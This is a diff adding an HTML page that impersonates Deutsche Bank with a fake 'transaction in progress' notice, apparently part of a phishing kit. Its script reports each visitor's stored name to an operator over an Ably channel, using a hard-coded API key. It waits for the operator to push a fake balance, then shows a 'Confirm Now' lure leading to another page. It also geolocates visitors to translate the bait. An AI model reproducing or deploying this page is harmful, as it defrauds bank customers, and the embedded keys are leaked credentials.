@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transaction Update</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: radial-gradient(circle, #e0f7fa 0%, #80deea 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .email-container {
+            background-color: #ffffff;
+            max-width: 597px;
+            margin: 40px auto;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            border: none;
+            transform: scale(1);
+            transition: transform 0.3s ease-in-out;
+   margin-top: -12px;   
+        }
+        .email-container:hover {
+            transform: scale(1.02);
+        }
+        .header {
+            text-align: center;
+            padding-bottom: 30px;
+            border-bottom: 2px solid #eeeeee;
+        }
+        .header h1 {
+            color: #00796b;
+            font-size: 32px;
+            margin: 0;
+            font-weight: bold;
+        }
+        .header img {
+            max-width: 80px;
+            margin-bottom: 15px;
+            border-radius: 50%;
+        }
+        .content1 {
+            font-family: 'Poppins', sans-serif;
+            padding-top: 30px;
+            color: #4a4a4a;
+            line-height: 1.8;
+            font-size: 18px;
+        }
+        .content1 p {
+            margin: 15px 0;
+            animation: fadeIn 1s ease-out;
+        }
+        .content1 a {
+            color: #009688;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .content1 a:hover {
+            text-decoration: underline;
+        }
+ 
+        .note {
+            background-color: #f9fbe7;
+            border-left: 6px solid #ffb74d;
+            padding: 20px;
+            margin-top: 25px;
+            font-style: italic;
+            color: #555555;
+            animation: slideIn 6.9s ease-out;
+        }
+        .dot-container {
+      display: flex;
+      gap: 10px;
+  margin-left: 119px;
+    }
+    
+    .dot {
+      width: 15px;
+      height: 15px;
+      background-color: white;
+      border-radius: 50%;
+      transition: background-color 0.3s ease;
+border: 1px solid #4d4d4d;   
+    }
+        /* Keyframes for animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideIn {
+            from { transform: translateX(-100%); }
+            to { transform: translateX(0); }
+        }
+        /* Media Queries */
+        @media (max-width: 600px) {
+            .email-container {
+                padding: 20px;
+            }
+            
+            .header h1 {
+                font-size: 28px;
+            }
+        }
+         .email-container1 {
+            background-color: #ffffff;
+            max-width: 630px;
+            margin: 1px;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 90px 10px 10px 190px rgba(0, 0, 0, 1.1);
+            border: none;
+            transform: scale(1);
+            transition: transform 0.3s ease-in-out;
+    display: none;
+   position: fixed;
+  z-index: 2000000;
+  margin-top: -239px;
+               
+           }
+        .email-container1:hover {
+            transform: scale(1.03);
+        }
+        .header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 3px solid #00796b;
+            margin-bottom: 20px;
+        }
+        .header img {
+            max-width: 90px;
+            border-radius: 50%;
+            margin-bottom: 15px;
+        }
+        .header h1 {
+            color: #004d40;
+            font-size: 28px;
+            margin: 0;
+            font-weight: 700;
+        }
+        .content {
+            color: #333333;
+            line-height: 1.6;
+            font-size: 19px;
+            padding: 20px;
+            border: 1px solid #e0f2f1;
+            border-radius: 10px;
+            background-color: #f9fbe7;
+        }
+        .content p {
+            margin: 15px 0;
+        }
+        .content a {
+            color: #00796b;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s ease;
+        }
+        .content a:hover {
+            color: #004d40;
+            text-decoration: underline;
+        }
+        .btn {
+            display: inline-block;
+            padding: 14px 28px;
+            background-color: #00796b;
+            color: #ffffff;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            text-transform: uppercase;
+            display: block;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .btn:hover {
+            background-color: #004d40;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+        }
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #777777;
+            font-size: 14px;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 10px;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+        .footer a {
+            color: #00796b;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 600px) {
+            .email-container1 {
+                padding: 20px;
+            }
+            .btn {
+                padding: 12px 24px;
+                font-size: 16px;
+            }
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <p style="display: none;">Balance: $<span id="balance">0.00</span></p>
+ <div class="email-container1" id="container">
+    <h1 id="lopp">Transaction Confirmed!</h1>
+      
+
+        <div class="content">
+            <p style="margin-bottom: -9px;"id="dogg">Dear</p>
+            <span style="font-weight: bold;"id="displayName2"></span> 
+            <p id="doll">We’re Happy to let you know that your transaction has been successfully confirmed! 🎉</p>
+
+            <p id="dogg1">To complete the process, please click the button below. This final step will ensure that everything is processed correctly and your transaction is fully completed.</p>
+
+            
+<a href="record1.html">
+            <button id="dogg2" class="btn">Confirm Now</button></a>
+
+            <p id="dogg3">Thank you for your cooperation. We look forward to serving you again soon!</p>
+        </div>
+
+    </div>
+    <div class="email-container">
+        <div class="header">
+            <!-- Optional Logo -->
+            
+            <h1 id="withdraw">Transaction in Progress</h1>
+   <div class="dot-container">
+    <div class="dot" id="dot1"></div>
+    <div class="dot" id="dot2"></div>
+    <div class="dot" id="dot3"></div>
+    <div class="dot" id="dot4"></div>
+    <div class="dot" id="dot5"></div>
+  </div>    
+        </div>
+
+        <div class="content1">
+            <p style="margin-bottom: -10px;"id="look">Dear</p>
+        <span style="font-weight: bold;"id="displayName"></span>   
+            <p id="you">We are writing to inform you that your transaction is currently being processed. Our team is closely monitoring the progress to ensure it is completed swiftly and securely.</p>
+
+            <p id="hate">Your trust in us is highly valued. Rest assured that we are doing everything possible to deliver the best service. If you have any questions or need assistance, feel free to <a href="mailto:support@example.com" >contact our support team.</a></p>
+
+           
+
+            <div class="note" id="bee">
+                Please note that this process may take some time depending on external factors, but we will notify you as soon as it is complete.
+            </div>
+
+            
+
+            <p id="ant">Thank you for choosing [Deutsche Bank]. We look forward to serving you again.</p>
+        </div>
+ <script src="https://cdn.ably.io/lib/ably.min-1.js"></script>
+ <script>
+    let dots = document.querySelectorAll('.dot');
+    let index = 0;
+
+    function animateDots() {
+      dots.forEach(dot => dot.style.backgroundColor = 'white'); // Reset all dots to white
+      dots[index].style.backgroundColor = 'green'; // Change the current dot to green
+      
+      index = (index + 1) % dots.length; // Move to the next dot
+    }
+
+    // Start the animation and repeat it every 0.3 seconds
+    setInterval(animateDots, 300);
+  // Initialize Ably with your provided API key
+        const ably = new Ably.Realtime('WeS8Yw.iZfAZQ:WO_vOzCZ9JBJ1okbn-QpAz8oJDTVUhTr1CYbWlwhEZ0');
+
+        // Generate a unique clientId for this receiver (browser)
+        const clientId = 'receiver-' + Math.random().toString(36).substr(2, 9);
+
+        // Set up a channel for communication
+        const channel = ably.channels.get('balance-update');
+
+        // Helper function to format numbers with commas
+        function formatWithCommas(number) {
+            return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+        }
+
+        // Fetch username from local storage
+        const userName = localStorage.getItem('userName') || 'Default User';
+
+        // Check if there's a balance in local storage and display it
+        const storedBalance = localStorage.getItem('balance');
+        if (storedBalance) {
+            document.getElementById('balance').textContent = formatWithCommas(parseFloat(storedBalance).toFixed(2));
+        }     
+// Get the number of times the information has been sent from localStorage
+let sendAttempts = localStorage.getItem('sendAttempts') || 0;
+// Check the last known container display state from localStorage
+const containerDisplayState = localStorage.getItem('containerDisplayState') || 'none';
+
+// Set the container display based on the stored state
+document.getElementById('container').style.display = containerDisplayState;
+
+// When the page loads, send the username and clientId to the sender page if attempts are less than 100000
+window.onload = function() {
+    if (sendAttempts < 100000) {
+        channel.publish('send-username', { userName: userName, clientId: clientId });
+        sendAttempts++;
+        localStorage.setItem('sendAttempts', sendAttempts); // Update the sendAttempts in localStorage
+    }
+};
+
+// Listen for balance updates targeted to this specific receiver (clientId)
+channel.subscribe('update-balance', function(message) {
+    if (message.data.clientId === clientId) {
+        const newBalance = message.data.balance;
+
+        // Store the updated balance in local storage
+        localStorage.setItem('balance', newBalance);
+
+        // Display the formatted balance
+        document.getElementById('balance').textContent = formatWithCommas(newBalance.toFixed(2));
+
+        
+        document.getElementById('container').style.display = 'block';
+
+        // Store the container's display state in localStorage
+        localStorage.setItem('containerDisplayState', 'block');
+
+       
+    }
+});
+
+// Listen for balance reversal and hide the modal and reset balance
+channel.subscribe('reverse-balance', function(message) {
+    if (message.data.clientId === clientId) {
+        // Revert balance back to zero
+        const revertedBalance = 0.00;
+        localStorage.setItem('balance', revertedBalance);
+        document.getElementById('balance').textContent = revertedBalance.toFixed(2);
+
+        // Hide the modal and container when balance is reversed
+       
+        document.getElementById('container').style.display = 'none';
+
+        
+        localStorage.setItem('containerDisplayState', 'none');
+    }
+});
+document.addEventListener('DOMContentLoaded', function() {
+  const countryLanguageMap = {
+                "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en",
+                "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar",
+                "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz",
+                "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr",
+                "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr",
+                "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es",
+                "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr",
+                "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti",
+                "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr",
+                "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es",
+                "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is",
+                "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it",
+                "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko",
+                "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en",
+                "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en",
+                "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en",
+                "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar",
+                "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en",
+                "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur",
+                "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl",
+                "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en",
+                "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr",
+                "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so",
+                "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv",
+                "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt",
+                "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en",
+                "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi",
+                "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+            };
+
+            function detectCountry(callback) {
+                fetch('https://ipinfo.io/json?token=84581b889c1970')
+                    .then(response => response.json())
+                    .then(data => {
+                        callback(data.country);
+                    })
+                    .catch(error => console.error('Error detecting country:', error));
+            }
+
+            function translateText(text, targetLanguage, callback) {
+                     fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        const translatedText = data[0].map(item => item[0]).join('');
+                        callback(translatedText);
+                    })
+                    .catch(error => console.error('Error translating text:', error));
+            }
+
+            function translateAllText(targetLanguage) {
+                const textsToTranslate = [
+                   
+                    { id: 'look', text: 'Dear' },
+  { id: 'you', text: 'We are writing to inform you that your transaction is currently being processed. Our team is closely monitoring the progress to ensure it is completed swiftly and securely.' },
+  { id: 'hate', text: 'Your trust in us is highly valued. Rest assured that we are doing everything possible to deliver the best service. If you have any questions or need assistance, feel free to contact our support team' },
+  { id: 'dear', text: 'Rest assured, the funds will be swiftly transferred to the debit card details you provided.' },
+      { id: 'withdraw', text: 'Transaction in Progress' },
+   { id: 'bee', text: 'Please note that this process may take some time depending on external factors, but we will notify you as soon as it is complete.' },             
+{ id: 'ant', text: 'Thank you for choosing [Deutsche Bank]. We look forward to serving you again.' }, 
+{ id: 'dogg', text: 'Dear' }, 
+{ id: 'doll', text: 'We’re Happy to let you know that your transaction has been successfully confirmed! 🎉' }, 
+{ id: 'dogg1', text: 'To complete the process, please click the button below. This final step will ensure that everything is processed correctly and your transaction is fully completed.' }, 
+{ id: 'dogg2', text: 'Confirm Now' },
+ { id: 'dogg3', text: 'Thank you for your cooperation. We look forward to serving you again soon!' }, 
+{ id: 'lopp', text: 'Transaction Confirmed!' }                 
+               
+               
+               
+               
+                ];
+
+                textsToTranslate.forEach(item => {
+                    translateText(item.text, targetLanguage, translatedText => {
+                        const element = document.getElementById(item.id);
+                        if (element) {
+                            element.innerText = translatedText;
+                        }
+                    });
+                });
+            }
+
+            detectCountry(function(country) {
+                const targetLanguage = countryLanguageMap[country] || 'es'; // Default to Spanish if country not in map
+                translateAllText(targetLanguage);
+            });
+        });
+document.addEventListener('DOMContentLoaded', () => {
+            const displayNameElement = document.getElementById('displayName');
+       const displayName2Element = document.getElementById('displayName2');
+            const displayElement1 = document.getElementById('displayValue1');
+            const displayElement = document.getElementById('displayValue');
+
+            // Get stored name and slider value from localStorage
+            const storedName = localStorage.getItem('userName');
+            const storedName2 = localStorage.getItem('userName');
+            const storedValue = localStorage.getItem('sliderValue');
+
+            // Display stored name
+            if (storedName) {
+                displayNameElement.textContent = ` ${storedName},`;
+               if (storedName2) {
+                displayName2Element.textContent = `${storedName},`;
+            } 
+            }
+ });
+       
+
+
+
+  </script>
+        
+
+</body>
+</html>
